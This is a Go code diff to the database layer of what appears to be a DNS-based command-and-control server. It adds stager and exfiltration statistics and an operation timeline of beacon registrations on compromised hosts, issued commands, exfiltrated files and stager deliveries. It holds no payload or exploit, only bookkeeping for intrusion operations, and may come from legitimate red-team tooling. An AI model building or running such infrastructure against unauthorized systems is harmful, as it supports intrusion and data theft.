@@ -7,6 +7,7 @@ import (
 	"database/sql"
 	"encoding/json"
 	"fmt"
+	"sort"
 	"strings"
 	"sync"
 	"time"
@@ -306,11 +307,11 @@ func (d *MasterDatabase) getPendingCompletion(taskID string) (string, int, bool)
 
 // MissingChunkRequest represents a request for missing chunks from a DNS server
 type MissingChunkRequest struct {
-	Type         string `json:"type"`          // "task" or "exfil"
-	ID           string `json:"id"`            // task_id or session_id
-	Tag          string `json:"tag,omitempty"` // exfil session tag for distributed lookup
-	TotalChunks  int    `json:"total_chunks"`
-	MissingChunks []int `json:"missing_chunks"`
+	Type          string `json:"type"`          // "task" or "exfil"
+	ID            string `json:"id"`            // task_id or session_id
+	Tag           string `json:"tag,omitempty"` // exfil session tag for distributed lookup
+	TotalChunks   int    `json:"total_chunks"`
+	MissingChunks []int  `json:"missing_chunks"`
 }
 
 // GetPendingMissingChunks returns tasks/exfils waiting for missing chunks
@@ -376,7 +377,7 @@ func (d *MasterDatabase) GetPendingMissingChunks(maxAge time.Duration) ([]Missin
 			// Look up the tag for this session for distributed chunk recovery
 			var tag string
 			d.db.QueryRow(`SELECT tag FROM exfil_session_tags WHERE session_id = ?`, sessionID).Scan(&tag)
-			
+
 			requests = append(requests, MissingChunkRequest{
 				Type:          "exfil",
 				ID:            sessionID,
@@ -563,7 +564,7 @@ func (d *MasterDatabase) reassembleTaskResultUnlocked(taskID string, totalChunks
 	}
 
 	// Update task status
-	d.db.Exec(`UPDATE tasks SET status = 'completed', result_size = ?, completed_at = ?, updated_at = ? WHERE id = ?`, 
+	d.db.Exec(`UPDATE tasks SET status = 'completed', result_size = ?, completed_at = ?, updated_at = ? WHERE id = ?`,
 		len(result), now, now, taskID)
 	dbLogAlways("✓ Reassembled task %s from recovered chunks (%d bytes)\n", taskID, len(result))
 }
@@ -589,7 +590,7 @@ func (d *MasterDatabase) ReceiveMissingExfilChunks(sessionID string, chunks map[
 	err := d.db.QueryRow(`
 		SELECT total_chunks FROM pending_exfil_completions WHERE session_id = ?
 	`, sessionID).Scan(&totalChunks)
-	
+
 	if err == nil && totalChunks > 0 {
 		var count int
 		d.db.QueryRow(`SELECT COUNT(DISTINCT chunk_index) FROM exfil_chunks WHERE session_id = ?`, sessionID).Scan(&count)
@@ -1758,7 +1759,7 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 		if err == nil && chunkIndex == 1 && (currentStatus == "exfiltrating" || statusWasSent) {
 			// Check if there's a pending completion for this task
 			_, pendingTotalChunks, hasPending := d.getPendingCompletion(taskID)
-			
+
 			// Complete if: known single-chunk OR pending completion says it's single-chunk
 			if totalChunks == 1 || (hasPending && pendingTotalChunks == 1) {
 				dbLog("Single-chunk result arrived after completion signal, marking complete now\n")
@@ -4385,7 +4386,237 @@ func (d *MasterDatabase) GetDatabaseStats() (map[string]interface{}, error) {
 	}
 	stats["recent_audit_events"] = auditEventCount
 
+	// Count stager sessions
+	var stagerSessionCount, completedStagerCount int
+	if err := d.db.QueryRow("SELECT COUNT(*) FROM stager_sessions").Scan(&stagerSessionCount); err != nil {
+		stagerSessionCount = 0
+	}
+	if err := d.db.QueryRow("SELECT COUNT(*) FROM stager_sessions WHERE completed = 1").Scan(&completedStagerCount); err != nil {
+		completedStagerCount = 0
+	}
+	stats["stager_sessions"] = stagerSessionCount
+	stats["completed_stager_sessions"] = completedStagerCount
+
+	// Count exfil transfers
+	var exfilTransferCount, completedExfilCount int
+	if err := d.db.QueryRow("SELECT COUNT(*) FROM exfil_transfers").Scan(&exfilTransferCount); err != nil {
+		exfilTransferCount = 0
+	}
+	if err := d.db.QueryRow("SELECT COUNT(*) FROM exfil_transfers WHERE status = 'complete'").Scan(&completedExfilCount); err != nil {
+		completedExfilCount = 0
+	}
+	stats["exfil_transfers"] = exfilTransferCount
+	stats["completed_exfil_transfers"] = completedExfilCount
+
 	return stats, nil
+}
+
+// TimelineEvent represents a single event in the operation timeline
+type TimelineEvent struct {
+	Timestamp   int64  `json:"timestamp"`
+	EventType   string `json:"event_type"`
+	Category    string `json:"category"`
+	Title       string `json:"title"`
+	Description string `json:"description"`
+	TargetID    string `json:"target_id,omitempty"`
+	Status      string `json:"status,omitempty"`
+}
+
+// GetTimeline returns a chronological list of operation events
+func (d *MasterDatabase) GetTimeline(limit int) ([]TimelineEvent, error) {
+	d.mutex.RLock()
+	defer d.mutex.RUnlock()
+
+	if limit <= 0 {
+		limit = 100
+	}
+
+	var events []TimelineEvent
+
+	// Get beacon registrations
+	rows, err := d.db.Query(`
+		SELECT id, hostname, username, os, created_at
+		FROM beacons
+		ORDER BY created_at DESC
+		LIMIT ?
+	`, limit)
+	if err == nil {
+		defer rows.Close()
+		for rows.Next() {
+			var id, hostname, username, os string
+			var createdAt int64
+			if err := rows.Scan(&id, &hostname, &username, &os, &createdAt); err == nil {
+				events = append(events, TimelineEvent{
+					Timestamp:   createdAt,
+					EventType:   "beacon_registered",
+					Category:    "beacon",
+					Title:       "Beacon Registered",
+					Description: fmt.Sprintf("%s@%s (%s)", username, hostname, os),
+					TargetID:    id,
+					Status:      "success",
+				})
+			}
+		}
+	}
+
+	// Get task events (created and completed)
+	rows2, err := d.db.Query(`
+		SELECT t.id, t.beacon_id, t.command, t.status, t.created_at, t.completed_at,
+		       COALESCE(b.hostname, 'unknown') as hostname
+		FROM tasks t
+		LEFT JOIN beacons b ON t.beacon_id = b.id
+		ORDER BY t.created_at DESC
+		LIMIT ?
+	`, limit)
+	if err == nil {
+		defer rows2.Close()
+		for rows2.Next() {
+			var id, beaconID, command, status, hostname string
+			var createdAt int64
+			var completedAt sql.NullInt64
+			if err := rows2.Scan(&id, &beaconID, &command, &status, &createdAt, &completedAt, &hostname); err == nil {
+				// Truncate command for display
+				cmdPreview := command
+				if len(cmdPreview) > 50 {
+					cmdPreview = cmdPreview[:47] + "..."
+				}
+
+				// Task created event
+				events = append(events, TimelineEvent{
+					Timestamp:   createdAt,
+					EventType:   "task_created",
+					Category:    "task",
+					Title:       "Task Created",
+					Description: fmt.Sprintf("[%s] %s", hostname, cmdPreview),
+					TargetID:    id,
+					Status:      "pending",
+				})
+
+				// Task completed event (if completed)
+				if completedAt.Valid && completedAt.Int64 > 0 {
+					events = append(events, TimelineEvent{
+						Timestamp:   completedAt.Int64,
+						EventType:   "task_completed",
+						Category:    "task",
+						Title:       "Task Completed",
+						Description: fmt.Sprintf("[%s] %s", hostname, cmdPreview),
+						TargetID:    id,
+						Status:      status,
+					})
+				}
+			}
+		}
+	}
+
+	// Get exfil transfer events
+	rows3, err := d.db.Query(`
+		SELECT session_id, file_name, file_size, status, created_at, completed_at
+		FROM exfil_transfers
+		ORDER BY created_at DESC
+		LIMIT ?
+	`, limit)
+	if err == nil {
+		defer rows3.Close()
+		for rows3.Next() {
+			var sessionID, fileName, status string
+			var fileSize int64
+			var createdAt int64
+			var completedAt sql.NullInt64
+			if err := rows3.Scan(&sessionID, &fileName, &fileSize, &status, &createdAt, &completedAt); err == nil {
+				// Exfil started event
+				events = append(events, TimelineEvent{
+					Timestamp:   createdAt,
+					EventType:   "exfil_started",
+					Category:    "exfil",
+					Title:       "Exfil Started",
+					Description: fmt.Sprintf("%s (%s)", fileName, formatBytes(fileSize)),
+					TargetID:    sessionID,
+					Status:      "receiving",
+				})
+
+				// Exfil completed event (if completed)
+				if completedAt.Valid && completedAt.Int64 > 0 {
+					events = append(events, TimelineEvent{
+						Timestamp:   completedAt.Int64,
+						EventType:   "exfil_completed",
+						Category:    "exfil",
+						Title:       "Exfil Completed",
+						Description: fmt.Sprintf("%s (%s)", fileName, formatBytes(fileSize)),
+						TargetID:    sessionID,
+						Status:      status,
+					})
+				}
+			}
+		}
+	}
+
+	// Get stager session events
+	rows4, err := d.db.Query(`
+		SELECT id, stager_ip, os, arch, created_at, completed_at, completed
+		FROM stager_sessions
+		ORDER BY created_at DESC
+		LIMIT ?
+	`, limit)
+	if err == nil {
+		defer rows4.Close()
+		for rows4.Next() {
+			var id, stagerIP, os, arch string
+			var createdAt int64
+			var completedAt sql.NullInt64
+			var completed bool
+			if err := rows4.Scan(&id, &stagerIP, &os, &arch, &createdAt, &completedAt, &completed); err == nil {
+				// Stager started event
+				events = append(events, TimelineEvent{
+					Timestamp:   createdAt,
+					EventType:   "stager_started",
+					Category:    "stager",
+					Title:       "Stager Session Started",
+					Description: fmt.Sprintf("%s (%s/%s)", stagerIP, os, arch),
+					TargetID:    id,
+					Status:      "receiving",
+				})
+
+				// Stager completed event (if completed)
+				if completed && completedAt.Valid && completedAt.Int64 > 0 {
+					events = append(events, TimelineEvent{
+						Timestamp:   completedAt.Int64,
+						EventType:   "stager_completed",
+						Category:    "stager",
+						Title:       "Stager Delivered",
+						Description: fmt.Sprintf("%s (%s/%s)", stagerIP, os, arch),
+						TargetID:    id,
+						Status:      "completed",
+					})
+				}
+			}
+		}
+	}
+
+	// Sort all events by timestamp descending
+	sort.Slice(events, func(i, j int) bool {
+		return events[i].Timestamp > events[j].Timestamp
+	})
+
+	// Limit total events returned
+	if len(events) > limit {
+		events = events[:limit]
+	}
+
+	return events, nil
+}
+
+// formatBytes converts bytes to human readable format
+func formatBytes(bytes int64) string {
+	const unit = 1024
+	if bytes < unit {
+		return fmt.Sprintf("%d B", bytes)
+	}
+	div, exp := int64(unit), 0
+	for n := bytes / unit; n >= unit; n /= unit {
+		div *= unit
+		exp++
+	}
+	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
 }
 
 // Stager Cache Management
